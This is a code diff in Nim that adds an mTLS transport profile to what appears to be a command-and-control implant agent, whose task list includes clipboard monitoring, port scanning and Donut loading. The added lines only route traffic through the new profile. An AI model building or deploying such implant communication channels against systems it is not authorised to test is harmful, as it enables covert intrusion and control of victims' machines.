@@ -6,6 +6,7 @@ import profiles/websocket
 import profiles/httpx
 import profiles/dns
 import profiles/tcp
+import profiles/mtls
 import utils/debug
 import utils/strenc
 import utils/task_processor
@@ -82,7 +83,7 @@ type
     mtClipboardMonitor, mtPortscan, mtDonut
   
   ProfileKind = enum
-    pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp, pkSmb
+    pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp, pkSmb, pkMtls
   
   Profile = object
     case kind: ProfileKind
@@ -99,6 +100,8 @@ type
     of pkSmb:
       when defined(windows):
         smbProfile: SmbProfile
+    of pkMtls:
+      mtlsProfile: MtlsProfile
   
   Agent* = ref object
     config: Config
@@ -127,6 +130,8 @@ proc send(profile: var Profile, data: string, callbackUuid: string = ""): string
   of pkSmb:
     when defined(windows):
       result = profile.smbProfile.send(data, callbackUuid)
+  of pkMtls:
+    result = profile.mtlsProfile.send(data, callbackUuid)
 
 proc setAesKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
@@ -143,6 +148,8 @@ proc setAesKey(profile: var Profile, key: seq[byte]) =
   of pkSmb:
     when defined(windows):
       profile.smbProfile.setAesKey(key)
+  of pkMtls:
+    profile.mtlsProfile.setAesKey(key)
 
 proc setAesDecKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
@@ -159,6 +166,8 @@ proc setAesDecKey(profile: var Profile, key: seq[byte]) =
   of pkSmb:
     when defined(windows):
       profile.smbProfile.setAesDecKey(key)
+  of pkMtls:
+    profile.mtlsProfile.setAesDecKey(key)
 
 proc hasAesKey(profile: Profile): bool {.used.} =
   case profile.kind
@@ -175,6 +184,8 @@ proc hasAesKey(profile: Profile): bool {.used.} =
   of pkSmb:
     when defined(windows):
       result = profile.smbProfile.hasAesKey()
+  of pkMtls:
+    result = profile.mtlsProfile.hasAesKey()
 
 proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
   case profile.kind
@@ -191,6 +202,8 @@ proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: str
   of pkSmb:
     when defined(windows):
       result = profile.smbProfile.performKeyExchange()
+  of pkMtls:
+    result = profile.mtlsProfile.performKeyExchange()
 
 proc cleanupConnection(agent: Agent) =
   ## Close profile connection to avoid keeping ESTABLISHED connections during sleep
@@ -201,6 +214,8 @@ proc cleanupConnection(agent: Agent) =
     agent.profile.httpxProfile.cleanup()
   of pkWebSocket:
     agent.profile.wsProfile.cleanup()
+  of pkMtls:
+    agent.profile.mtlsProfile.cleanup()
   else:
     discard  # Other profiles don't need cleanup
 
@@ -213,6 +228,8 @@ proc reconnectProfile(agent: Agent) =
     agent.profile.httpxProfile.reconnect()
   of pkWebSocket:
     agent.profile.wsProfile.reconnect()
+  of pkMtls:
+    agent.profile.mtlsProfile.reconnect()
   else:
     discard  # Other profiles don't need reconnect
 
@@ -236,6 +253,8 @@ proc newAgent*(): Agent =
     result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
   of "tcp":
     result.profile = Profile(kind: pkTcp, tcpProfile: newTcpProfile())
+  of "mtls":
+    result.profile = Profile(kind: pkMtls, mtlsProfile: newMtlsProfile())
   of "smb":
     when defined(windows):
       result.profile = Profile(kind: pkSmb, smbProfile: newSmbProfile())
